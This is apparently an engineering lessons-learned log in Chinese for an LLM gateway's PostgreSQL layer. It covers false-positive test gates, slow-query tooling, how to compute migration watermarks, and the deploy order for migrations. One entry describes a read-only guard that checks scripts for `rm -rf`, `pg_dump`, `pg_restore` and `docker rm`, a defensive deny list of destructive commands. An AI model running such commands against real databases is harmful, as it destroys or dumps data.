  1. ★ 内联 SQL 里的 `if err == nil {…}` / `_ =` 必须补 WARN 日志；
  2. ★ 凡是「面板/列表恒空」类症状，**先问「SQL 是不是根本没跑成」**，
     而不是先怀疑「本来就没数据」；
  3. ★ 把这类 SQL **提成包级常量**并配一道**真库执行门**（只读 SELECT ⇒ 零足迹）——
     形状门/文本门抓不到「列在不在」「类型对不对」「语法成不成立」；
  4. ★ 保留响应字段但值不可得时，**在代码里写明原因**，别让「恒 0」冒充「真实计数」。
- 证据：`docs/audit/2026-10-21-R69-R70-跨进程竞态与静默降级残留.md` §3；
  门 `admin/session_family_runtime_sql_test.go`（真库执行 + 端到端 + 两条静态守卫），
  变异 A/B/B2/C/D 全红 + sha256 逐字还原。
- 状态：已修（14b64ddf4 / 695c1c59a）

## 2026-10-21 — 新量具能一次性挖出旧量具看不见的缺陷族；但量具自己要先自证可用（Seen: 1/3）
- 任务 / 缺陷：慢 SQL 这一维此前**没有可用量具** ——
  本地 PG 装了 `pg_stat_statements` 却**没进 `shared_preload_libraries`**
  （与 §143.20 在 211 上的发现同源）⇒ 查询直接报
  `pg_stat_statements must be loaded via "shared_preload_libraries"`。
  改走 PG 错误日志通道（`log_destination=stderr` ⇒ 进 `docker logs`），
  `ALTER DATABASE … SET log_min_duration_statement = 2000` 后**一次挖出 4 处残留**（见上一条）。
- 根因：① 缺陷族是「**运行时**残留」，而此前的验收面全是「接口返回 200」；
  ② 慢 SQL/错误日志是**唯一**能覆盖「SQL 跑失败但被吞」的通道；
  ③ 量具本身也会坏（扩展装了没 preload / 日志目录为空 / docker logs 写 stderr 而不是 stdout）。
- 防复发检查：
  1. ★ 判「有没有慢 SQL」之前先确认量具**真的可用**：
     `SELECT count(*) FROM pg_extension WHERE extname='pg_stat_statements'` **不等于**可用 ——
     必须再确认它在 `shared_preload_libraries` 里（否则查询直接报错）；
  2. ★ 本地 PG 的慢查询/错误通道优先级：
     `pg_stat_statements`（可用时）→ PG 错误日志（`docker logs <pg容器>`）→ 应用日志；
     macOS 上**拿不到** `/var/lib/docker/containers/<id>/userdata/ctr.log`（Docker Desktop 不暴露）；
  3. ★ 临时打开的阈值类设置**必须复原**（`ALTER DATABASE … RESET`），否则量具留在生产配置里；
  4. ★ `docker logs` 写 **stderr** ⇒ 重定向要写 `> file`（`2>&1 > file` 会得到空文件）。
- 证据：`docs/audit/2026-10-21-R69-R70-跨进程竞态与静默降级残留.md` §3.1、§4.3；
  慢 SQL 读数：1 小时窗口内 8 条 >2s，**全部是 `COPY … TO stdout`（后台导出）**，页面路径 0 条。
- 状态：已用（阈值已复原）

## 2026-10-21 — 静态守卫自己会有假阳性：门红了先读门在守什么（Seen: 1/3）
- 任务 / 缺陷：§3 那道静态守卫的第一版，**两处判红都是误判** ——
  ① 用「`session_dim` 之后 400 字符内出现 `.session_id`」判 ⇒ 误判了
  `admin/session_turns_v2.go:766` 与 `admin/turns_sessions.go:167`
  （那两处是正确写法 `sd.gw_session_id = s.session_id`，窗口跨到了下一张表的合法列）；
  ② 「`ARRAY_AGG` 前面有没有左括号」⇒ 误判了 `ARRAY_AGG(ma.raw_name ORDER BY ma.raw_name) AS aliases`
  这种**根本没有下标**的写法；
  ③ 断言前没剥注释 ⇒ 把自己注释里的说明文字当成代码判红。
- 根因：文本匹配的**窗口**与**作用域**都没有对齐语义：
  「某个别名下的某个列」「某个表达式后面有没有下标」都得按语法边界判，不能按字符邻近判。
- 防复发检查：
  1. ★ 静态门命中后**逐条人工核对**再改代码 —— 门红 ≠ 代码错（这条与
     §R65「门红了先读门在守什么」同族）；
  2. ★ 别名/表达式级别的判据要**按语法边界**取（先取别名、先配平括号），
     不用「窗口内出现」这种近似；
  3. ★ 断言 SQL/代码文本前**剥注释**（复用仓内既有的 `stripGoComments`，不重复实现）；
  4. ★ 门自己要有**变异验证**（改坏 ⇒ 必须红；红因必须是这条门），
     否则「恒绿门」会以「门绿」的形式骗过所有人。
- 证据：`docs/audit/2026-10-21-R69-R70-跨进程竞态与静默降级残留.md` §3.6。
- 状态：已修（门收紧后全绿）

## 2026-10-21 — ★★★★★ **「跑过了」≠「形态对了」：量具必须断言形态，而且漏检的门比红门更危险**（llm-gateway-go R69 · D3 批次二 收尾）
- 场景：合并 35 个提交后，在**全新 probe 库**上复验，本轮改好的两条门**变红**
  （`relation "session_turns_hot" does not exist` / `canonical 视图只投影 0/2 列`）。
- 实测翻车：★ **代码是对的** —— 在一个**有 `session_turns_hot`** 的库上两条门**全绿**。
  ⇒ ⇒ **红来自环境形态，不来自代码** ⇒ 若照着「红」去改代码，就会**改坏本来正确的门**。
- 根因：★ `scripts/audit/probe-onetime-db-shape.sh` 建出来的库**缺 `session_turns_hot`**
  （母表在、hot 表不在、details 在），而脚本跑完 ensure 链打印的是
  **「✓ ensure 链已跑（库现在 = 产品真实形态）」** ⇒ ⇒ **这句话是错的**；
  ⇒ ★★ 且 ensure 链自己的门 `TestFreshInstallRuntimeShape_EnsureChain` 在这个状态下 **PASS**
  ⇒ ⇒ **它没检 hot 表** ⇒ ⇒ **一道漏检门**。
- ⇒ ⇒ ★ **通用式**：
  1. ⭐⭐⭐⭐⭐ **量具要断言「形态」，不能只断言「跑过了」** ——
     「ensure 链跑过了」≠「库 = 产品形态」⇒ **守卫必须点名校验关键关系在不在**；
  2. ⭐⭐⭐⭐⭐ **一条门在自己缺关键对象时仍然绿 ⇒ 它是漏检门** ——
     ⇒ 判据里必须包含「**那个对象在不在**」这一条；
  3. ⭐⭐⭐⭐ **自己新写的门变红 ⇒ 先确认「是不是环境变了」** ——
     本轮的红来自 **incoming 提交 + probe 库形态** ⇒ **不是我的代码坏了**；
  4. ⭐⭐⭐⭐ **脚本里的成功文案（「库现在 = 产品真实形态」）不算证据** ⇒ 必须是可证伪的断言；
  5. ⭐⭐⭐ **追一条红门时，判它「是缺陷还是形态」之前，先把被测形态量出来**
     （★ 本轮若不查，多条「v1 族退役缺陷」会被定性错）。
- 证据：`itgate_r69_final`（probe 库）缺 `session_turns_hot`；
  `itgate_r69_d3b`（有该表）上 `TestV1WriteLiveness_RealDB` 与
  `TestRequestClassCarriedBySessionDetails` **全绿**。
- 溯源：llm-gateway-go R69 轮（D3 侧·批次二），§19.19.7 + 审计文档 §9。

## 2026-10-21 — ★★★★★ **「红」的第一嫌疑还有第三种：我测的树不是最新的树**（llm-gateway-go R69 · D3 批次二 收尾）
- 场景：并行会话跨会话通报：「`domains/streaming` 整包仍有一条红（`TestLogAudioUsageStopWriteGate`），
  属你负责的 D3 族 ⇒ 归你改瞄」。
- 实测翻车：★ 我在自己的树上**跑不出**这条红 —— 那个测试名**在当前树里根本不存在**
  （只剩历史文档里有）。⇒ 回头查树：
  `git merge-base --is-ancestor 54424a7d7 c6c86437d` ⇒ **否**
  ⇒ ⇒ ★★ **我 23:29 那次逐包隔离测量用的树，落后 origin/main 两个提交**
  （`54424a7d7` 22:59 收口了 4 个同族红门、`7f6a73a44` 23:13）⇒
  ⇒ ⇒ **那批清单里的 `domains/streaming::TestLogAudioUsageStopWriteGate`
  与 `internal/sessionv2mirror` 的 3 条，是「旧树产物」** ⇒ ⇒ **不是缺陷，是没更新**。
- ⇒ ⇒ ★ **通用式**：
  1. ⭐⭐⭐⭐⭐ **任何「红」的断言，先确认「我测的树 = 最新的树」** ——
     判据：`git merge-base --is-ancestor <关闭提交> HEAD`（否 ⇒ 你的读数是旧树的）
     或 `git log -1 -- <那个文件>`（看最后一次改动是不是在你测之后）；
  2. ⭐⭐⭐⭐⭐ **「收到红门通报 ⇒ 立刻去改」是最容易犯的错** ——
     ⇒ 先在自己的树上**复现一次**；复现不出来 ⇒ **先查树，再查代码**；
     ⇒ 否则会去改一条**已经被别人关掉**的门 ⇒ 制造无谓冲突、还可能把好门改坏；
  3. ⭐⭐⭐⭐ **通报里带「树状态」比带「红/绿」有用** ——
     本次对方报的**是准确的**（他们的树确实还有旧文件）⇒ ⇒ ⇒
     **不是「过期树误报」，是「两棵不同的树」** ⇒ ⇒ ⇒
     ⇒ **共享仓里，「红」不是绝对事实，是「在某棵树的某个库上的事实」**；
  4. ⭐⭐⭐⭐ **共享仓里读数必须带三个坐标**：**树**（`git rev-parse HEAD`）＋
     **库**（新建还是复用）＋ **DSN 集**（全量还是部分）⇒ 缺一个读数就不可比；
  5. ⭐⭐⭐ **跨会话通报的价值正在于此** ——
     ★ 本条就是**对方通报帮我发现我自己的记录错误**的（我的清单里有 4 条已经过期了）。
- 证据：`git merge-base --is-ancestor 54424a7d7 c6c86437d` = 否；
  最新树实测 `domains/streaming` = **ok 150.264s**、`internal/sessionv2mirror` = **ok 1.096s**（全绿）。
- 溯源：llm-gateway-go R69 轮（D3 侧·批次二 收尾），§19.19.8。
## 2026-10-21 §143.38 轮 — 退役链的失败维度不止「迁移内容对不对」，还有「**执行顺序**」（Seen: 1/3）

- ⇒ ⇒ ★★★★★ **通用式：一条 DROP 迁移的失败维度有三个，不止一个** ——
  ① **内容**对不对（删的东西是不是该删的）；
  ② **仓内**还有谁引用它（本轮：仓内零活引用，见下）；
  ③ ★★★ **执行顺序**：★ **被删的关系，可能仍被【还没更新的二进制】引用**
  ⇒ ⇒ ★★ **⇒ 退役链必须钉「顺序」，而顺序是仓内的门【看不见】的**
  （门只能看仓内，看不见生产上跑的是哪个二进制）。
- ⇒ ⇒ ★★★★ **本轮实测（生产只读）**：
  - 迁移水位 = **889** ⇒ 迁移 890（v1 `request_logs` 族真删）**未执行**；
  - v1 族还在（`request_logs_2026_10` **334,669 行 / 1,015 MB**）⇒ 890 的**非空闸**会**拒绝执行**；
  - ★★ **生产上正在跑的 auto-route 亲和度聚合（408 次 / 1,209.0 s / max 28.9 s）
    逐字仍是【三条 v1 臂】**，而仓内 HEAD 早已是【一条臂】⇒ **部署漂移被逐字证实**；
  - ⇒ ★★★ **若先执行 890 ⇒ 那条聚合整句 42P01 ⇒ 亲和度学习链断裂且【静默】**
    （stale-while-error ⇒ 仍服务旧快照 ⇒ 无告警、载荷不变）。
- ⇒ ⇒ ★★★★ **判据要落在「生产上正在跑的那条语句」上**，不要落在版本号/部署记录上 ——
  ⇒ `pg_stat_statements` 里查「还有没有语句引用被 DROP 的关系」⇒ 直接可判。
  ⚠ ★★ **但它只记成功语句** ⇒ **一旦已经 42P01 断链，那条语句就从统计里消失**
  ⇒ ⇒ ★★★ **⇒ 这类核验必须在【断裂发生之前】跑**（= 迁移执行之前），
  不能等出事了再查。
- ⇒ ⇒ ★★★ **PostgreSQL 的语义要记牢：同一条语句的 FROM 里【任何】被提及的关系不存在
  ⇒ 【整条语句】失败**，不是「那条臂失败、其余照跑」⇒ ⇒ **一个子查询里的旧表名
  就能带走整条聚合**。
- ⇒ ⇒ ★★ **仓内能提供的是「核验手段」，不是「核验结论」** ⇒ 本节把判据落成
  `scripts/audit/verify_890_cutover_precheck.sql`（只读），**生产实测跑出
  `BLOCKED: 仍有活跃语句引用 v1 族 ⇒ 【禁止执行 890】，先部署新二进制`**。
- ⇒ ⇒ ★★★★ **量具纪律（本轮最值钱的一处）：「位置」与「像不像 SQL」是两个独立条件，缺一个就是噪声源** ——
  · 第一版口径（「像 SQL 的字符串字面量」+ 子串包含表名）⇒ **442 处假阳性**；
  · 收窄后仍差两类：★ **SQLite** 存储（`?` 占位符 / `rowid` / `main.`，与 PostgreSQL 的 DROP 无关）
    与 ★ **canonical 视图前缀**（`request_logs_with_current_month` 不被删，但 `request_logs` 是它的前缀）；
  · ⇒ 最终口径：**① 含【语句】关键字**（SELECT/INSERT INTO/UPDATE/DELETE FROM/WITH
    —— ★ 不能把裸 `from`/`join` 当信号，中文散文里到处是「读 FROM public.request_logs rl」）
    **② 关系名在 FROM/JOIN 位置**（可选 schema 限定）+ **词边界**成立
    ⇒ ⇒ **442 → 2 → 0**。
  ⇒ ⇒ ★★ **「子串计数」与「位置计数」是两种不同的判据族**（前者 §143.37 已记）。
- ⇒ ⇒ ★★★ **门自己的「判据语义自测」当场把门逼正确了**（三次）：
  ① 注释里的关系名被判成读点 ⇒ **先剥 SQL 注释**；
  ② `FROM public.X` 的 schema 限定没剥干净 ⇒ **限定名要连标识符一起去掉**；
  ③ 散文被当成 SQL ⇒ **补上「语句关键字」这一条独立条件**。
  ⇒ ⇒ ★★ **⇒ 「判据语义自测」不是可选项：它是把「判据写对了」这件事变成可执行的唯一办法。**
- ⇒ ⇒ ★★★★★ **★★ 「优雅降级」≠「不是缺陷」—— 判「是不是缺陷」要问
  「① 会不会**每次**都产生错误 ② 用户能不能分辨『本来没数据』与『坏了』」**（2026-10-21 实测，
  llm-gateway-go §143.38，★ 判词被并行会话当场纠正）
  · **本轮我判**：「`partitionedTables` 里还有 `_request_logs` ⇒ 890 之后该 admin 功能 42P01
    ⇒ 读错误路径后发现是 `slog.Warn` + `continue` ⇒ **优雅降级 ⇒ 不是缺陷**」；
  · ★★★ **并行会话 `14b64ddf4` 判**：同一条是**缺陷** ——
    「**每次**调用都刷一条 42P01 的 WARN，**且该表状态永远拿不到** ⇒ 页面看不出报错但那块信息恒空」
    ⇒ 修法 = `to_regclass` 探表 + `retired` 字段 + 端到端门；
  · ⇒ ★★ **⇒ 我的判词太宽松**：只读到「错误被吞掉」就停了，
    ★ **没问「吞掉之后用户看到的是什么」**；
  · ⇒ ⇒ ★★★ **⇒ 通用式**：★ **降级可以接受，但「每次都产生错误」+「用户分辨不出」就是缺陷类**
    （原话：**「降级可接受，降级原因必须留痕」**）
    ⇒ ⇒ ★★ **⇒ 只读错误路径不足以定性**；
  · ⇒ ⇒ ★★ **⇒ 而且「我判成阴性」不等于「它就没事」** ——
    ★★ **本轮据此撤回了自己两件未发布的产物**（元数据字段 + 与之重复的门）
    ⇒ ★ **重复的门只会变成噪声；行为化修法比元数据登记更强**
    （元数据登记运行期不读 ⇒ 只能被门看见，挡不住任何运行期行为）。
- 证据：runbook `§143.38`；生产只读实测（2026-10-21）：水位 889 / v1 族 334,669 行 / ~1.9 GB /
  停写已确认（hot 0 行、max_ts 7 天前）/ 亲和度聚合 408 次 · 1,209.0 s · max 28,931 ms /
  前置核验 verdict = BLOCKED；门 `admin/section_14338_retirement_consistency_test.go`（**6 条**）；
  仓内改动 = `admin/data_lifecycle_partition.go` 新增**纯元数据**字段 `RetiredByMigration`（运行期不读 ⇒ 零行为影响）。
- 溯源：llm-gateway-go4 §143.38 轮（2026-10-21）。

## 2026-10-21 — 「判据外的事实」既不能当「判据不满足」，也不能当「判据满足」（Seen: 1/3）
- 任务 / 缺陷：上一轮给 P0 清单逐条写了「现状」状态栏（19 ✅ / 2 🟡），
  本轮把**状态栏自己**按「判据执行」重审一遍 ⇒ **21 条里 5 条判严了、2 条判松了**。
- 根因（两个相反方向，同一个错法）：
  ① **判严了 5 条**（G-1 / A-4 / A-5 / A-6 / M-3）—— 拿**任务列**的字面要求当**判据列**的要求。
     例：A-4 判据只写「同输入同 slug」+「未匹配 ⇒ 落未归类」，两句都有门且实跑绿 ⇒ **判据满足**；
     而「推断出的新项目不会自动创建」是**判据外的策略增强**（属主决策）⇒ 上一轮拿它当 🟡 的理由不成立。
  ② **判松了 2 条**（G-7 / M-5）—— 把**「我实测到的读数」**当成了**「判据被钉住」**。
     例：M-5 我实测了「`memory` 表 962 行 / 按项目 21 行 / 21/21 与磁盘逐字节一致」，
     就写了 ✅ ⇒ 但仓内**没有**任何可执行断言钉这一条 ⇒ 实测读数**不能替代**门。
- 防复发检查：
  1. ★ **判据只有一栏时，「判据满足」的含义是唯一的** ⇒ 判级必须**逐条对着那一栏**核，
     **不许**把任务列、文档叙述、「我觉得应该有的」掺进来；
  2. ★ 写状态栏时，**每一格**都要能回答「**判据第 3 列的那句要求，被哪道门钉住了？**」
     —— 答不上 ⇒ 该格只能是「**判据无门**」，不能是 ✅；
  3. ★ 判据是**全称量词**时（「每条…都有…」），**一条**没有 ⇒ 整条不满足（G-7 就是这么被证伪的）。
- 证据：方案文档 `docs/audit/2026-10-20-三项目会话治理-审计与执行方案.md` §13.10.5（21 行逐条对照表）
  + §3.3 三张表的第 4 列重写。
- 状态：待观察

## 2026-10-21 — 「源文件级门」不能用 `-overlay` 变异：它在运行时读磁盘，overlay 管不到（Seen: 1/3）
- 任务 / 缺陷：本轮给 memora 写了一道「读路径不许碰写路径」的门，它**读源文件**做断言。
  用 `go test -overlay` 做变异（把写路径接回读路径）⇒ **门仍然绿** ⇒ 第一版门**恒绿**。
- 根因：`-overlay` 替换的是**编译器**看到的文件；门在**测试运行时**用 `os.ReadFile` 读**磁盘上的原文件**
  ⇒ 变异根本到不了断言那里。
- 防复发检查：
  1. ★ **变异手段要匹配门的类型**：
     - 编译期门（包内函数/常量）⇒ `-overlay`（干净、不碰仓内文件）；
     - **运行时读文件的门** ⇒ 必须**就地改文件**（备份 → 改 → 跑 → **按原路径 md5 校验还原** → 再跑绿）；
  2. ★ 判断标准很简单：**门断言的内容，变异能不能真的送到它眼前？** 送不到 ⇒ 门恒绿。
- 证据：memora `cmd/memory-bank/readonly_verify_test.go`（3 条）、
  变异记录见方案文档 §13.10.6（变异红 → 还原后 md5 一致 → 再跑绿）。
- 状态：待观察

## 2026-10-21 — 门的前提自证不只抓「实现坏」，也抓「**配套动作**写错」（Seen: 1/3）
- 任务 / 缺陷：本轮给网关 G-7② 写真库 EXPLAIN 门时，变异 harness 的**还原语句**写错了：
  `CREATE INDEX … ON ONLY public.sessions` ⇒ **不给已有分区建子索引** ⇒ 还原后门仍然红。
- 根因：那个索引是**分区索引**（建在 `ONLY` 父表上），真实机制是**三段式** ——
  逐分区 `CREATE INDEX CONCURRENTLY` → 父表 `ON ONLY` 壳 → `ALTER INDEX … ATTACH PARTITION`。
  只写第三段的前一半 = **只造了壳** ⇒ 「catalog 查得到、EXPLAIN 看不到」。
- 防复发检查：
  1. ★ 门里要有「**前提自证**」：不只自证被测对象在位，还要自证**它生效所需的条件**在位
     （本例：**分区索引必须有子索引**）⇒ 少了这条，门会对着一个空壳说「通过」；
  2. ★ 变异 harness 的「**还原**」不要手写简化版 ⇒ **优先重跑那条迁移**（幂等），
     否则还原出来的东西可能**只还原了一半**；
  3. ⇒ 通用式：**还原动作和被测对象一样需要前提自证**。
- 证据：`domains/session/v2/session_family_p0_realdb_test.go`
  `TestSessionsPartitionDateAntiJoinUsesIndexRealDB`（前提自证②）、
  `scripts/audit/verify-session-family-p0-realdb.sh`（M5 + 还原改成重跑迁移 888，终态 7/0）。
- 状态：待观察

## 2026-10-21 — 「迁移水位」必须用**集合差**算，不能用 `max(version)`（Seen: 1/3）
- 任务 / 缺陷：本轮读生产 252 的迁移水位，第一次写成「生产 = **V359**，本地 = 890 ⇒ 落后 531 个」——
  ★ **错的**。
- 根因（两层）：
  ① `schema_migrations.version` 是 **text 且格式混杂**（生产 433 行里 3 行不是纯数字：
     `V359`、`2026-07-13-multimodal-token-fields-hot`、`2026-07-14-routing-persistence-hardening`）
     ⇒ `max()` 按**字典序**返回 `'V359'`（`'V' > '9'`）⇒ **量具在骗人**；
  ② 即使格式统一，**数字大小也不可比** —— 两边**号段命名空间不同**
     （生产 430 个 numeric 版本 vs 本地 68 个；生产有、本地没有的 **363** 个是历史号段）。
- 防复发检查：
  1. ★ 算水位 = **集合差**（`本地 ∖ 生产`），不是 `max()`；
  2. ★ 先看**列类型**：是 `text` 且取值格式混杂时，**任何聚合比较都要先过滤格式**
     （本例 `WHERE version ~ '^[0-9]+$'`）；
  3. ⇒ 通用式：**`max()` 在「同一列里混着多种格式」时必假** —— 与 §5.4 的
     「`count(*)` 返回 0 有三种成因」是同族：**聚合函数的读法必须先自证前提**。
- 证据：方案文档 §13.10.3（生产 numeric 430 / max 999 / 本地 68 / max 890；
  ★ **本地有、生产没有的只有 1 个：`890`** ⇒ 与库面读数互相印证：生产 v1 族还在，正因为 890 没上）。
- 状态：待观察
- ⇒ ⇒ ★★★★★ **★★ 「迁移水位」是【台账口径】，「形态」是【对象存在性口径】——
  两者在稀疏台账的实例上会【大幅背离】**（2026-10-21 实测，llm-gateway-go §143.39）
  · **上一轮的结论**：§143.20 写了「211 的 `llm_gateway` **落后 13 个迁移**（869 vs 882）」
    ⇒ ★★ **本轮被实测证伪**：211 的台账虽然只到 **869**，
    ★ **但 870~889 里绝大多数对象【已经存在】**（870/871/873/874/877/878/882 的索引、
    883/884 的视图全在）⇒ ⇒ **真实形态差集 = 5 个对象**，不是 13~20 个迁移；
  · ⇒ ⇒ ★★★ **⇒ 通用式**：★ **判断一个实例的形态，必须逐个对象核存在性，
    不能看台账最大版本** ⇒ ★ **「水位落后 N 个迁移」这句话在稀疏台账上会骗人**；
  · ⇒ ⇒ ★★★ **⇒ 更重要的一条**：★ **量具背离一旦被观察到一次，就必须推广到全量。**
    ★ **§143.20 当时其实已经摸到边了**（它写了「对象在、台账无」）——
    ★ **但只对 877 这一条成立** ⇒ ⇒ 结论被留在「附带」的位置，
    ★ 还用了一个**会被误读成「形态差」**的措辞 ⇒ ⇒ **下一个会话会拿它当定论。**
  · ⇒ ⇒ ★★ **⇒ 通用式二**：★ **观察到「量具 A 与量具 B 背离」时，
    要问的是「A 和 B 差多远」，而不是「A 和 B 差 1 还是差 13」**
    ⇒ ★ **背离的「量级」才是结论**（差 1 个 ⇒ 可能只是记账漏了；差 13 个 ⇒ 形态真的落后）。
- ⇒ ⇒ ★★★★★ **★★ 「退役链」与「升级链」的顺序约束【方向相反】，叠在一起就把顺序钉死了**（§143.39）
  · **退役链（删对象，890）**：**先部署新二进制** ⇒ 否则旧二进制里引用 v1 表的语句
    **整句 42P01**（同一条 FROM 里任何被提及的关系不存在 ⇒ 整句失败）；
  · ★★★★ **升级链（加列，885）**：**先执行迁移** ⇒ 否则新二进制的写路径
    `INSERT INTO session_turns_hot (..., host, tags, ...)` ⇒ **42703**；
  · ⇒ ⇒ ★★★ **完整顺序 = `885 → 部署新二进制 → 890`**（两台实例都要走）；
  · ⇒ ⇒ ★★★★ **⇒ 而升级链那个陷阱比退役链【危险得多】（三重放大）**：
    ① ★ **`db.Open` 的 ensure 链不补这两列** ⇒ **boot 不会失败**（绿着启动）；
    ② ★ **蓝绿验收只探 `readyz` / `version` / 网页面** ⇒ **不覆盖写路径**
    ⇒ ⇒ **42703 不会被切流验收拦住**；
    ③ ★ **错误被吞**（记 WARN + 跳过）⇒ **页面看不出报错，流量静默丢**；
  · ⇒ ⇒ ★★ **⇒ 通用式**：★ **给二进制加「显式列」的写路径时，
    必须确认目标库的列已经到位** ⇒ ★ **否则「新二进制 + 旧库」是一个绿着的故障**。
- ⇒ ⇒ ★★★★ **★★ 判据出假红时，先问「判据【懂不懂这门语言】」——
  剥注释器 / here-doc 提取器 / 模式匹配器全都是【量具】**（§143.39，当场踩到）
  · **本轮第一版只读性判据** = 「按 SQL 剥注释 + 全文扫 DDL 关键字」
    ⇒ ★★ **当场假红 4 条**（`CREATE ` / `DROP ` / `ALTER ` / `TRUNCATE`）；
  · ⇒ ★ **根因不是脚本有毒，是判据不懂语言**：脚本是 **shell**，
    而剥注释器只认 SQL 的 `--` / `/* */` ⇒ **文件头那段 shell 注释被当成真 DDL**；
  · ⇒ ★ **改法不是放宽判据，而是把判据改成语言感知的**：
    只读性 = 「**here-doc 主体**（真正发给 psql 的那段 SQL）是只读的」
    + 「**shell 代码**里没有 `rm -rf` / `pg_dump` / `pg_restore` / `docker rm`」；
  · ⇒ ★★★ **改完仍然红，而这次红得对**：★ **提取器只剥了前引号、没剥尾引号**
    ⇒ 定界符变成 `SQL'` ⇒ **永远匹配不到终止行** ⇒ 块一路吞到**文件尾**
    ⇒ ⇒ ★ **这是判据自己的真 bug，被门当场抓住**（不是脚本的问题）；
  · ⇒ ⇒ ★★★★ **⇒ 通用式**：★ **量具必须先在自己的语义上被自测**
    ⇒ ★★ **否则它会把「判错」伪装成「有毒」**
    ⇒ ★★ **而「先改判据」还是「先改产物」要分清**：
    ★ **本例两者都要改，但顺序必须是：先让判据说清自己在判什么**
    （否则你会去改一个没毒的东西）。
- ⇒ ⇒ ★★ **★★ 判据的【范围】必须跟着「真正会到达产物的东西」走**（§143.39）
  · 「脚本里出现 `pg_stat_statements` 这个词」≠「脚本依赖它」
    ⇒ ★ **判据应是「会到达数据库的路径上没有它」**（here-doc 主体 + psql 调用行），
    ★ **不是「全文没有它」**（文件头解释「为什么不用它」就会假红）；
  · ⇒ ★★ **同理，「只读」的范围是「发给 psql 的那段 SQL」**，
    ★ **不是脚本全文**（散文里的 `CREATE OR REPLACE` 不是 DDL）。
- 证据：runbook `§143.39`；211 只读实测（2026-10-21）：部署二进制 `7a60b1b1-dirty`
  （亲和度聚合**逐字仍是两条 v1 臂**）/ 台账 63 行 · 最大 869 / v1 族 35,506 行 ≈107 MB
  （停写门 `false` @ 2026-10-13 07:01，数据末端 07:01:04）/ 会话族 hot 2,993 行 34 MB（实时）/
  父表 0 行（**promote 从没搬过行**）/ 驱动表 `auto_route_selections` 3 行、6 天无新行 /
  缺 `host`/`tags` 两列 + `idx_session_turns_search_fts` + 888 的两个 join 索引；
  211 侧预检 `scripts/audit/verify_890_cutover_precheck_211.sh` 实跑 **verdict = BLOCKED（2 项阻塞）**；
  门 `admin/section_14339_retirement_precheck_test.go`（**6 条**）。
- 溯源：llm-gateway-go4 §143.39 轮（2026-10-21）。
